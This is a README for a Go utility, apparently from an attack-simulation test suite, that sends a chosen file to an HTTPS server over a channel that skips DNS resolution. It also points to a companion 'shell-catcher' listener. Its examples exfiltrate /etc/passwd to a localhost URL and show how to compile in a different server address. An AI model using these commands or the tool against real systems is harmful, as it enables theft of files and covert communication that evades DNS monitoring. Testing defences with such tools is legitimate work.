Comms Without DNS
=================
Nearly the same as [`comms_over_https`](../comms_over_https) but can skip doing
DNS resolution by passing the server's IP addres and port via an environment
variable, `ALPT4ATS_REAL_ADDRESS`, by default.

A crude shell-catcher may be found in the
[`letsencryptshellcatcher`](../letsencryptshellcatcher) directory.
Run it with `-https /somepath`, and put the same `/somepath` in the server
URL.

File Descriptor
---------------
The address and file as whitespace-separated words from file descriptor 7, and
override the environment variables.  If only one word is read, it is taken to
be the address.

### Examples
Set the address and file via a heredoc:
```sh
./comms_without_dns 7<<_eof
https://localhost:5555/somepath /etc/passwd
_eof
```

Set just the address via bash's Here String:
```sh
./bin/comms_without_dns 7<<<"https://localhost:5555/somepath"
```

Environment Variables
---------------------
The URL and file may be set with environment variables, overriding
compile-time settings, as follows

Default Variable        | Description
------------------------|------------
`ALPT4ATS_ADDRESS`      | HTTPS Server URL
`ALPT4ATS_FILE`         | File to send on the HTTPS connection
`ALPT4ATS_REAL_ADDRESS` | Optional HTTPS Server IP:Port

The variable names may be changed at compile-time, as below.

Compile-time Config
-------------------
Compile time configuration is possible with the linker's `-X` (as in 
`go build -ldflags '-X main.Foo=bar'`).  The variables are as follows

Variable                                               | Default                        | Description
-------------------------------------------------------|--------------------------------|------------
[`main.Address`](./comms_without_dns.go#L28)           | `https://localhost:4444/shell` | HTTPS Server URL
[`main.AddressEnvVar`](./comms_without_dns.go#L29)     | `ALPT4ATS_ADDRESS`             | Environment variable which sets the HTTPS Server URL
[`main.File`](./comms_without_dns.go#L30)              | `/etc/hosts`                   | File to send on the HTTPS connection
[`main.FileEnvVar`](./comms_without_dns.go#L31)        | `ALPT4ATS_FILE`                | Environment variable which sets the File to send on the HTTPS connection
[`main.RealAddressEnvVar`](./comms_without_dns.go#L32) | `ALPT4ATS_REAL_ADDRESS`        | Environment variable which sets the server's real IP address and port

When building with the [Makefile](../../Makefile) these may be passed in with
the `LINKFLAGS` environment variable, as in
```sh
LINKFLAGS="-X main.Address=https://example.com:8080/notshell" make
```
